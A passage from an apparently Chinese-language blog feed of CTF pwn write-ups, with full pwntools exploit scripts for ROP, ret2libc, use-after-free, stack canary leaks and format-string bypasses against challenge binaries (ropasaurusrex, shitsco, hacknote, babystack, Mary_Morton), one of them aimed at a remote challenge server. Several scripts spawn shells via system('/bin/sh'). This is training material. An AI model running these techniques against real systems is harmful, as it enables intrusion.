pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045f2a5) # syscall ; ret<br><br>a &#x3D; process(&#39;vss&#39;)<br>a.recvuntil(&quot;Password:&quot;)<br>pay &#x3D; &#39;&#39;<br>pay &#x3D; &#39;py&#39; + &#39;a&#39;*(0x46) + p64(0x46f205) + &#39;a&#39;*(0x58-0x50) + p<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>跑一下<br><img src="4.png" alt="4"><br>说下收获<br>1.初识stack pivot//针对栈空间不够溢出<br>2.ropchain熟悉<br>3.初识静态链接</p><h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013: ropasaurusrex"></a>PlaidCTF 2013: ropasaurusrex</h2><p>和xctf的level3一个样<br>exp都一样。。。<br>典型的ret2libc</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br><br>a &#x3D; process(&#39;.&#x2F;rop&#39;)<br>elf &#x3D; ELF(&#39;rop&#39;)<br>libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)<br>pay &#x3D; &#39;a&#39;*0x88 + &#39;aaaa&#39; + p32(elf.symbols[&#39;write&#39;]) + p32(0x8048426) + p32(1) + p32(elf.got[&#39;write&#39;]) + p32(4)<br>a.sendline(pay)<br>addr &#x3D; u32(a.recv(4))<br>print addr<br>sys &#x3D; libc.symbols[&#39;system&#39;] + addr - libc.symbols[&#39;write&#39;]<br>sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next() + addr - libc.symbols[&#39;write&#39;]<br>pay2 &#x3D; &#39;a&#39;*0x88 + &#39;aaaa&#39; + p32(sys) + &#39;aaaa&#39; + p32(sh)<br>a.sendline(pay2)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>说下收获<br>1.其实呢。。。主要是它给了个库文件，我就去加载了，然后一直没出来。。。应该加载的是自己虚拟机上的库，这点以后注意<br>2.某些命令的使用</p><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>迫于某些原因，先把堆给看看，rop的一些以后接着填坑</p><h2 id="defcon-ctf-qualifier-2014-shitsco"><a href="#defcon-ctf-qualifier-2014-shitsco" class="headerlink" title="defcon ctf qualifier 2014 : shitsco"></a>defcon ctf qualifier 2014 : shitsco</h2><p>不得不说，国际性大赛的pwn。。。如果逆向不怎么好的话很难写<br>运行程序的话可以看到有很多命令。。。<br>password输入正确后可以用flag命令获得flag<br>整体利用思路就是要把password通过show打印出来</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="5.png" alt="5"><br>首先可以看到pwd在程序开始被读入<br><img src="6.png" alt="6"><br>在bss段<br>通过调试可以看出来分配的堆是个双向链表<br>name指针，值指针，上一个和下一个链表的指针。<br>大小为16字节，<br>而且可以发现，第一个链表的下一个指针永远指向下一个<br>这就可以uaf<br>输入俩个长度16个值<br>free掉后在输入一个长度16的值就会打印对应地址了<br>因为first fit把。。。猜测<br>毕竟堆我还刚入门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br><br>a &#x3D; process(&#39;.&#x2F;shitsco&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set a aaaaaaaaaaaaaaaa&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set b aaaaaaaaaaaaaaab&#39;)<br><br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set a&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set b&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>pay &#x3D; &#39;set c &#39; + &#39;\xA0\xC3\x04\x08&#39;*4           #0x8048D40<br>print pay<br>a.sendline(pay)<br>a.sendline(&#39;show&#39;)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>说下收获<br>1.firstfit的认识<br>2.堆入门</p><h2 id="HITCON-hacknote"><a href="#HITCON-hacknote" class="headerlink" title="HITCON hacknote"></a>HITCON hacknote</h2><p>这题让我搞懂UAF了<br>首先看看程序整体就是个菜单<br><img src="7.jpg" alt="7"><br>看看菜单内容<br><img src="8.png" alt="8"><br>可以看到很多堆漏洞必备的功能<br><img src="9.png" alt="9"><br>delete操作，单单free，会引起UAF<br>看看add操作<br><img src="10.png" alt="10"><br>可以看到先申请俩指针，第一个指向put函数，第二个指向函数内容<br>利用方法就很简单了</p><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先申请俩个大小大于12的块<br>然后free<br>再申请一个大小为8的块，覆盖put函数地址为magic<br>并用put打印触发漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>a &#x3D; process(&#39;.&#x2F;hacknote&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Note size :&quot;)<br>a.sendline(&#39;16&#39;)<br>a.recvuntil(&quot;Content :&quot;)<br>a.sendline(&#39;aaaaaaaa&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Note size :&quot;)<br>a.sendline(&#39;16&#39;)<br>a.recvuntil(&quot;Content :&quot;)<br>a.sendline(&#39;aaaaaaaa&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;2&#39;)<br>a.recvuntil(&quot;Index :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;2&#39;)<br>a.recvuntil(&quot;Index :&quot;)<br>a.sendline(&#39;0&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Note size :&quot;)<br>a.sendline(&#39;8&#39;)<br>a.recvuntil(&quot;Content :&quot;)<br>pay &#x3D; p32(0x8048986)<br>a.sendline(pay)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;3&#39;)<br>a.recvuntil(&quot;Index :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>exp写的比较丑没有像标准wp一样定义函数<br>但能跑</p><p>说下收获<br>1.堆得分配和释放<br>2.UAF的标准操作</p><h2 id="厦门邀请赛"><a href="#厦门邀请赛" class="headerlink" title="厦门邀请赛"></a>厦门邀请赛</h2><p>写了4小时没出来。。。<br>后来看了wp，大致思路是对的，有些地方的优化做的不是太好</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>题目大致是个类似菜单的<br><img src="12.png" alt="12"><br>1是输入<br>2是打印<br>有canary大致可以猜到是要泄露出canary才行<br><img src="13.png" alt="13"><br>看程序发现输出函数是puts<br>//一开始还不知道puts输出到\x00才结束，试了几次后发现了这个漏洞<br>所以我们只需要填充栈，到canary之前<br>然后打印就能打出canary的高7个字节<br>最后一个字节经过调试发现一直是00所以需要填充<br>当然回车正好可以，所以用pwntools编写的时候需要注意必须是sendline而不是send<br>不然的话不能leak canary<br>canary leak后就可以ret2libc<br>leak出基地址后就差不多完事了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><span class="hljs-comment">#a = remote(&#x27;111.198.29.45&#x27;,49770)</span><br>a = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>rdi_ret = 0x400a93<br>rsi_r15_ret = 0x400a91<br>lib = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>fmt = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-number">*136</span><br>a.sendline(fmt)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-number">*0</span>x88+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>canary = u64(a.recv(7).rjust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;canary found:&quot;</span>,hex(canary)<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*136</span> + p64(canary) + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>pay += p64(rdi_ret) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>pay += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>pay += p64(0x400908)<br>a.sendline(pay)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>paddr = u64(a.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-attribute">drop</span>=<span class="hljs-literal">True</span>).ljust(8,&#x27;\x00&#x27;))<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;addr found:&#x27;</span>,hex(paddr)<br>base = paddr - lib.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = base + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bash = base + lib.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).next()<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;one_gadget:&#x27;</span>,hex(one_gadget)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*136</span> + p64(canary) + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span> + p64(rdi_ret) + p64(bash) + p64(sys)<br>a.send(pay)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;#############&#x27;</span><br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;are you ready&#x27;</span><br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;#############&#x27;</span><br>a.interactive()<br></code></pre></td></tr></table></figure><h2 id="ASIS-CTF-Finals-2017-Mary-Morton"><a href="#ASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="ASIS-CTF-Finals-2017 Mary_Morton"></a>ASIS-CTF-Finals-2017 Mary_Morton</h2><p>和上面一题有点像，但是简单了好多<br>就是个格式化字符串绕canary<br>后门都已经写好了给你</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">32882</span>)<br><span class="hljs-comment">#a = process(&#x27;./mary_morton&#x27;)</span><br>print <span class="hljs-keyword">a</span>.recv()<br>print <span class="hljs-keyword">a</span>.recv()<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&#x27;%23$lx&#x27;</span>)<br>test = <span class="hljs-keyword">a</span>.recv(<span class="hljs-number">16</span>)<br>canary = int(test,<span class="hljs-number">16</span>)<br>print hex(canary)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;3. Exit the battle &quot;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>backdoor = <span class="hljs-number">0x00000000004008DA</span><br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">136</span> + p64(canary) + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span> + p64(backdoor)<br><span class="hljs-keyword">a</span>.sendline(pay)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑小结-re题解(附题)</title>
    <link href="/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%B0%8F%E7%BB%93-re%E9%A2%98%E8%A7%A3-%E9%99%84%E9%A2%98/"/>
    <url>/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%B0%8F%E7%BB%93-re%E9%A2%98%E8%A7%A3-%E9%99%84%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="178a8dab652d91e0afd533380445936eec59d03b7cac911a5c8c0b0b08af8786"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向分析之花</title>
    <link href="/2019/04/06/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E4%B9%8B%E8%8A%B1/"/>
    <url>/2019/04/06/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E4%B9%8B%E8%8A%B1/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f4fd91405c66d0e5edfd68b633a48150225c048a34d48805ce6f80ae726d90e7">1ffc8fe07dba719b7195eb9462a983d4a1917c87b9b162a5107e73eafb342f0e462b11f53847b8ba9038ce58d44f30beb1769e582dba0e94be90d64484e41f210ff8a6b3ad47b20a444ac2159fe632efff0824a4dee584c302ad62429cf048e315245dfaa3a1fbada1d57a5db15b6e87d6723dbbf28ff8426fe200fefcb5ccf0fc12f9915e8bc06cc23572bceb15c320e10c4ae693b1d2ec612971b5cde5f053e98e6176a276ceca5bbd23b858e130b54e63557b64b8d735026cffd146004c9d1984ab6b893bc4a0b0e616e1697beada9b14cdc2cf813883920d55cb57ce21d6235f481562cbc05e1a0bf046dd4a9b0a87f632762e03df334a1656a07efc7990e02e84b03761d774582a4c22037f8df5b33090e7d8648f53bdd1d1e2c27ddf979ca21c8b90a5c44dcac6f6d3ce29457a4f4198ad5246090f6180d64f900d2282100383350bdf1eac0ed374cc258fe49883819e30bb30b6facbaa4c33f991483c64d6f0b830eeff4e84c63fd5ce3aa8627da0f94d853f82fa86c942b176e5900961efae2729a80ddedee1b36e0ab69b99138460296e0936c0511e9cbe1e5a5429b54e9d8800838ec33f28c488ae4f02500bef327b30b7440ad116e857cb0d061c755468517c24d2dc17c3a9c84304f4ebb9ed082e10c9ae78946fa88e39c5e681f623b1758384a6e800491027f4a5833ea7e5bb331cf892c61b65bec1405b6d7094bcc455d731def62367e6970b27db37d2ccfa08563b8a046488e61607415833456f7bc347b361934d48b55d5c51742c9b223b4435af824c07ce2eb6668e349c4b1fe0309ea36115b339071a3a0fa266b162a86dfb7991b3548687f4722f9b6d713f261b16bb272750277170b68a1a9709071c2849b03c8920b92ee88f91fed19b88553d547ff56a6cfeae4a3c78b47c9c1ad09e53059a0f7457eff3c8819db66fe2f74e3ebf8dbcaf954852a7ce695dc36f383ec478e5b74400094973bb47e3ca69c1bcd81674d3adceb0170924f7b8fdcc4cc313d3a97cfb07c034ee5b3c3f8654093c7f30e78e8637d83c0dfed34338414c1ac57b423194833eff71966e75e862f81ea614e6b97150204720e92ee2a357cfbdaa77277dc1a621ef1a75000a76b7f877dc8e70ddcbe27807850439ea4d397a54083cae49b637174df515e5758f372b2c734a291e1aff7cd84865df6daa2923d9805b8ce3bb690fd470492d58729b1f107a4d7e1ce7ab2be2976c74b13e9c42b1b2fddcbe1e64622ff22839c1771cf4df5c68f756b5012fee206edb4a95383590a320484b0112ec8b4fa4baebfb1d813bef1017fc8a0b84de6cfc172f6e92c55bd389d7dc4fbd036bb6c652e504a8ef8fec9f887d7b0819e9c8b24b8159e3699f5b0bb9c604e719b5e5b513e4dc64417d21d3fd9fbf460e676300dff000dbf9e0c45b99cd75c92c6bc4f04f5d293e86c3691ef2c9649c2a98d68e72b0277437e77f5e82e81b3ccc708dc4a527ee79741024cbf9c96983633ac04c6b162f617354b147d22b396475fed4620aab857696a459152048fe5175526e2ca183af4c757db1fd9ec89b72bf90cbceb69517547eb5faf826196a7cd329451baf3714baf4b48a46da0bc8fcd9bf46f01a0c1052b378e86788dbaf77a8f8f31f900d073178a6ed6fd64ddf79fed5d8191da059dec473343ce5146a49fdde83fe595eb2b9b8db59ab7a3f3ae2b2d1d987ffa1c5367a67ddcf86814ec536dc40ddeec22ec76856b3fc083b2d4a5a18297406b73270256a3798d1d081edb292cd010665a3c0a151efc3d3cb6f30b928eeb639ccec48eecad1d69e2b5daa7e7d44bc10fff030712cab3f2e6894c29782967e357278a8fc46f3f738f015d6de3c54e76344597134f5238a537583aaec77457f1b7476163e25f50ac746fc3ea49c09804a6d4ae80fd3f04de23bd87ea17630374e78ec0eeccdcbbcbf3d7155cc9ed0ac813d7a03acd55d6ed39307448c5818e12fe902d893d11fd7694402a97460f1a28493a7cc368e86c522dbab0bde8ce7dc6231e287c3bebb9c3a17d79c7c7b08e61e0d24705b1f32e0942c60d788b3137d32da028626acbc8a8eab92c4162d6d1415f152f48f154614b50e3339b64157921a59a4f6b5dd31d058afc2a45c27c6f4afd2d95a1ceae44a117ec84535fff109fc47a3a45f1eff6429a4d628a5d44215b539ae3fedf1459c6d63dadb03f0a7a15f4182d78421c1bf2d9ea77e020dd1e27cc1cfb3b6e103acb27970819a3d1f833a973d3f9b731b4482f53a6a747367e8ab92f319b92d46cfe5f76520bd05ac86f69070f7f80f0583c507a0ace97a333ad52878650347ca5f12c2fd94729a9e22521993cd11f0b4602c1568e498ab06193a51ce96aa8d22f4dd22daae0879c0d63a7cde40de3e0f7abc19739f2280e3a305f173001e4c572df6f9adda62e23835dc4247bc17f776240e5ef76bc93e18bbbbfd5eab9062da88975edd0d40f07371c381fa0c0e1af60b48394428928ae4b3a9de924ab91dce9294b81125850331182fb4517d8b33671153321f9bc27024330353a6082e4f9e09df5525838c2862be3890f0ec028ced8261ec307a1bdea30df003804279112018795214cfbec869b0fface00be024cb7388213e4bf6ad625b86e40cd10180575aac49d019bf501f0250afd208f27387df3ff05fa4871573ce0b07cb479975ef4c58db6a546bf6be0c8cfa848259143a47131bd64e972049f66fb80bdb86451174f0fc3ef76111f6bf002a0f91d5150625651febe29e3357e73e5386030dd186d800b623d8884948228713de6d5a79b72a27c26127f02162aaa40faad469957086388344dba9e873190e5d3df7599cbb97b3d9dfdbf1f5e0194aeab23aef7b810dc50c59410c6e79c15fae7cce1a113151a38687a4854e634cb0125d2d0dd37245a9ecfaafccbd817076766c49081ff026d3e9ca4c155ecf9ffcfbab14f566cd93b3bd6912180e558866845e28e1341b3b17fd3b73811b23be24df19e24a0bab4200a60848de820fbdbd6d09bae3bc7e4ce6bc7bad4d8e31a028bf81594c38750f459f0c5c0ad7f5e5439e1716c829525cd2a19e5618c2db667c6b29128a49a67413c184537f0ec11b487ca4882e0ba07ba4b03812772268bc3e9900413a0d40876df0545681763c510461da422a644e360c026c7407d84193ea642805a7ab851ede675471a0f80f8bfb0a8f786ad71db055696cc3a81a3054ccb864bad801fec412065e7034318199d929c9ae619e3c8a956a354272d968fdf6a4b0d15b7d7ff975ae8efc0ccede872757cd0cf661cfb886dafbe530db5376498233662ac19e8d22b3f4dcbb7b6b332a7dfc6f15b806198b932626ca892cf0a0ad52de8a55f93d86f7d158e2fcc7eadea484bf3fadb81f391c5d5cd31aef28362b47b5d65248208890354012b121ef159e739a375c513f57d1b291a18199a2d40faad728cfcadc26c85fe5e9349c224e5915b33b68be275a1daf53678857764410a1a9ec2a3910df294aee5840c089b572f0e44bc6dfe89f6cdcd77f884f5acccf6fe083f67f272635132f393fbe0fbb49c701ac535e83264950ab904db7d72ddccdc63fd9aa38750a5b90f9e63ea15a09fa74d1a64b4de05b462213d7b97b47b80e77bc34b142f434f07c1e4718931d5ef250b51b436eece877fcf0246e859aea7465819640510f6e394df67ff2e09fd2fda1fce9936b05cd6c791b3ddc32abcbd370bd277246c483347bd0293686b1d87784b5924f3b34baebd1331bb51058e7210195ecf3a46de5f6a4e614953fee3b3d761906ced02b8ffd13256e0708cabb76c58e95eb8a4d0e6f697c2c82bb031c94fba888321d100835812d4ec8879da4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit学习 week4</title>
    <link href="/2019/04/05/iot-rootkit%E5%AD%A6%E4%B9%A0-week4-1/"/>
    <url>/2019/04/05/iot-rootkit%E5%AD%A6%E4%B9%A0-week4-1/</url>
    
